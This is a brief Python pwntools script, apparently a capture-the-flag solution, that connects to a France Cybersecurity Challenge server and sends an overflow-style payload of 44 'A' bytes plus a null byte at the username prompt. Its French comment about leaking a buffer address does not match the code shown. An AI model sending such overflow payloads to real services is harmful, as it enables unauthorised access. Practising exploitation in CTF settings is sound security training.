#! /usr/bin/env python3
from pwn import *

s = remote('challenges.france-cybersecurity-challenge.fr',port=2100)

#recupere l'adresse leak du buffer 
s.recvuntil('username: ', drop=True)

payload = 'A'*44 + '\x00'
s.sendline(payload)
s.interactive()
s.close()
